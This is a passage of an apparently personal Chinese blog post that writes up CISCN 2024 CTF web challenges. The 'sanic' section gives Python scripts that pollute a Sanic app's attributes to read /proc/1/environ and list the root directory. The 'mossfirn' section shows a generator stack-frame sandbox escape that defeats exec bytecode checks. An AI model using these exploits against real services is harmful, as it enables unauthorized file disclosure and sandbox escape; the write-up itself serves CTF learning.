class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;/proc/1/environ&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[2]----------&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = session.post(host + route2, json=path_data, timeout=<span class="number">5.0</span>, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!]time out&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 发送 GET 请求到 src 路由并获取文本</span></span><br><span class="line">r = session.get(host + route3, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[3]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="sanic-不对没有这么简单"><a href="#sanic-不对没有这么简单" class="headerlink" title="sanic: 不对没有这么简单"></a>sanic: 不对没有这么简单</h3><blockquote>
+<p>上面说到在ctfshow中可以&#x2F;proc&#x2F;1&#x2F;environ读到flag，但是看wp说现实中是不行的</p>
+</blockquote>
+<ol>
+<li><p>不同的点：实际情况中无法猜测到flag的所在位置，必须进一步解决</p>
+</li>
+<li><p>重要的还是思想，这里应该是无法rce？有目录就很容易了，可以任意读文件</p>
+<ol>
+<li><p>看看static吧，就剩这一个切入口了，搜索魅力时刻到了，“sanic获取static的可视化目录界面”，发现directory_view，<strong>如果可以还可以污染指定为别的目录进行查看，无敌了</strong>，先解决view吧</p>
+</li>
+<li><p>这里能做到的就是污染了，现在能做到就是污染，写写污染链子，<strong>艹，失败了，但还是有学到的</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>._apply_static(static)/<span class="variable language_">self</span>._future_statics.add(static) <span class="comment"># 一开始就两个？问题不大，先看static</span></span><br><span class="line">_future_statics</span><br><span class="line">directory_handler</span><br><span class="line">directory_view</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试的payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>:<span class="string">&quot;__init__\\\\.__globals__\\\\.Sanic._future_statics.directory_handler.directory_view&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>:<span class="string">&quot;True&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>看别人wp+调试的payload</p>
+<ol>
+<li>注意json可以传递对应的值，所以要对应类型比如布尔的true这些</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://localhost:5555/&quot;</span></span><br><span class="line"><span class="comment"># host=&quot;http://f6642576-3813-4cd6-ae6f-7a6dc692a220.challenge.ctf.show/&quot;</span></span><br><span class="line">route1 = <span class="string">&quot;login/&quot;</span></span><br><span class="line">route2 = <span class="string">&quot;admin/&quot;</span></span><br><span class="line">route3 = <span class="string">&quot;src/&quot;</span></span><br><span class="line">route4 = <span class="string">&quot;static/&quot;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Session 对象</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置初始的 cookies</span></span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;&quot;adm\\073n&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送带有特定 cookie 的 GET 请求到 login 路由</span></span><br><span class="line">r = session.get(host + route1, proxies=proxies)</span><br><span class="line"><span class="comment"># r = session.get(host + route1)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[1]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造污染payload</span></span><br><span class="line">directory_view = &#123;</span><br><span class="line">    <span class="comment"># &quot;key&quot;:&quot;__init__\\\\.__globals__\\\\.app.router.name_index[&#x27;__mp_main__&#x27;].static.handler.keywords[&#x27;directory_handler&#x27;].directory_view&quot;,    # 这个不行，[]只能识别数字的，也就是索引</span></span><br><span class="line">    <span class="comment"># &quot;key&quot;: &quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;, # 这个也不行，这里就是不要他们转义，是同一个变量名，可以下断点</span></span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(host+route2,json=directory_view,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="comment"># r = session.post(host+route2,json=directory_view,timeout=5)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[2]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">path_payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/&quot;</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(host+route2,json=path_payload,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[3]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">r = session.get(host+route4,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[4]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="sanic-核心要点"><a href="#sanic-核心要点" class="headerlink" title="sanic: 核心要点"></a>sanic: 核心要点</h3><ol>
+<li><em><strong>我嘞个源码题</strong></em>，疯狂看源码，但是思考的思路还是有要求的<ol>
+<li>网上查不到就看源码，并且抓住要点，比如污染的绕过需要的是<strong>路径的解析</strong></li>
+<li>输入无法做手脚就从解析做手脚</li>
+</ol>
+</li>
+</ol>
+<h2 id="mossfirn"><a href="#mossfirn" class="headerlink" title="mossfirn"></a>mossfirn</h2><h3 id="mossfirn-思路"><a href="#mossfirn-思路" class="headerlink" title="mossfirn: 思路"></a>mossfirn: 思路</h3><ol>
+<li>看mossfirn源码显然是flask沙箱，哪里有亮点呢？<ol>
+<li>使用subprocess运行命令</li>
+<li>会将flag和id注入到运行的文件中，只要获取到flag就够了，但是这里id有什么用？</li>
+</ol>
+</li>
+<li><strong>可控输入源：{id}.txt</strong>，可以获取json数据中的code</li>
+<li>捋一捋思路<ol>
+<li>运行runner.py时会进行字面特殊字符检查，字节码检查和特殊调用检查，这些都需要进行绕过</li>
+<li>返回时还有一部分检查，这部分容易，直接进行编码或者断开返回即可了</li>
+<li><strong>现在的关键目标：读取到外部的flag然后进行返回编码值</strong></li>
+</ol>
+</li>
+<li>急急急急急<ol>
+<li>搜啊搜，感觉网上的题和这里不太符合啊，都是那种链子，难道还要源码</li>
+<li>切换一下思路，围绕“python exec中获取外部变量目的的沙盒逃逸”这个进行提问，有发现了一个栈帧逃逸的，看看<ol>
+<li><p>还在找到了一个L3Hctf的题目很像，wc那他们不是薄纱</p>
+</li>
+<li><p>还是要慢下来看才可以，<strong>能出就好了，急干嘛？</strong></p>
+</li>
+<li><p>看讲解说是next在内置函数被禁掉了，需要用列表表达式for语句获取，本地测试如下，有几个点说一下啊</p>
+<ol>
+<li><strong>点1</strong>: 一个gi_frame会停在函数执行完毕的行数</li>
+<li><strong>点2</strong>: 套了多少函数就要跳多少次，比如这里要跳到main里，需要<code>__main__&lt;-quote_caller&lt;-f</code>两个箭头跳两次</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;you got me!&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quote_caller</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame</span><br><span class="line"></span><br><span class="line">    g=f()</span><br><span class="line">    frame=[x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(frame.f_back.f_back.f_locals[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"></span><br><span class="line">quote_caller() <span class="comment"># 成功获取到</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这样之后就是<strong>直接往上走再读flag的情况了，找字面量这些就ok了</strong>，这里有些坑点</p>
+<ol>
+<li>访问的路由需要是<code>/run</code>而不能是<code>/run/</code>，第二个返回404</li>
+<li>这里生成器要返回<code>g.gi_frame.f_back</code>才可以，如果直接返回<code>g.gi_frame</code>不可以，这里的细节放到另一篇博客里再讲《python栈帧沙箱逃逸》</li>
+<li>这里的next()由于<code>__builtins__</code>无法直接调用，所有需要使用列表表达式进行绕过</li>
+<li>一开始遇到了LOAD_GLOBALS问题，搜不到，顾名思义，这里使用了global的的变量，在对应的op.txt文件中检查触发点，只有一个，让他变成局部的，所以加多了一层wrapper</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://2b531651-5e31-4c7e-9a9f-42e1c62b5b8b.challenge.ctf.show/&quot;</span></span><br><span class="line">route=<span class="string">&quot;run&quot;</span></span><br><span class="line"><span class="comment"># proxies=&#123;</span></span><br><span class="line">    <span class="comment"># &quot;http&quot;: &quot;http://localhost:8080&quot;,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">payload=\</span><br><span class="line"><span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string">def wrapper():</span></span><br><span class="line"><span class="string">    def evil_generator():</span></span><br><span class="line"><span class="string">      yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g=evil_generator()</span></span><br><span class="line"><span class="string">    frame = [x for x in g][0]</span></span><br><span class="line"><span class="string">    # print(frame)</span></span><br><span class="line"><span class="string">    # print(frame.f_back)</span></span><br><span class="line"><span class="string">    # print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    # print(frame.f_back.f_back.f_back)</span></span><br><span class="line"><span class="string">    func = frame.f_back.f_back.f_back.f_globals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;].str</span></span><br><span class="line"><span class="string">    res = frame.f_back.f_back.f_back.f_code.co_consts</span></span><br><span class="line"><span class="string">    for i in func(res):</span></span><br><span class="line"><span class="string">        print(i+&quot;,&quot;,end=&quot;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wrapper()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] constructing payload&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">opcodeIO = StringIO()</span><br><span class="line">dis(payload, file=opcodeIO)</span><br><span class="line">opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">opcodeIO.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] disassembling payload to op.txt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">open</span>(<span class="string">&quot;/home/kc1zs4/Code/CTF/op.txt&quot;</span>, <span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;\n&quot;</span>.join(opcode)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] op.txt saved&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] failed to save op.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送payload</span></span><br><span class="line">r = session.post(host+route,timeout=<span class="number">5</span>,json=&#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: payload,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] get resp&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 截取到我们的目标后就把,去掉就好</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> answer.split(<span class="string">&quot;,&quot;</span>):</span><br><span class="line">   <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="mossfirn-要点"><a href="#mossfirn-要点" class="headerlink" title="mossfirn: 要点"></a>mossfirn: 要点</h3><ol>
+<li>比较考验实时搜搜的能力，秘塔是个好ai啊</li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">1.</span> <span class="toc-text">simple_php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-php-%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">simple_php: 思路流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-php-%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">simple_php: 核心要点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">2.</span> <span class="toc-text">easycms</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easycms-%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">easycms: 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easycms-%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.</span> <span class="toc-text">easycms: 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sanic"><span class="toc-number">3.</span> <span class="toc-text">sanic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic-%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">sanic: 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic-%E4%B8%8D%E5%AF%B9%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95"><span class="toc-number">3.2.</span> <span class="toc-text">sanic: 不对没有这么简单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic-%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9"><span class="toc-number">3.3.</span> <span class="toc-text">sanic: 核心要点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mossfirn"><span class="toc-number">4.</span> <span class="toc-text">mossfirn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mossfirn-%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">mossfirn: 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mossfirn-%E8%A6%81%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text">mossfirn: 要点</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/12/01/ciscn24/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&text=ciscn24"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&is_video=false&description=ciscn24"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ciscn24&body=Check out this article: https://kc1zs4.github.io/2024/12/01/ciscn24/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&name=ciscn24&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/12/01/ciscn24/&t=ciscn24"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
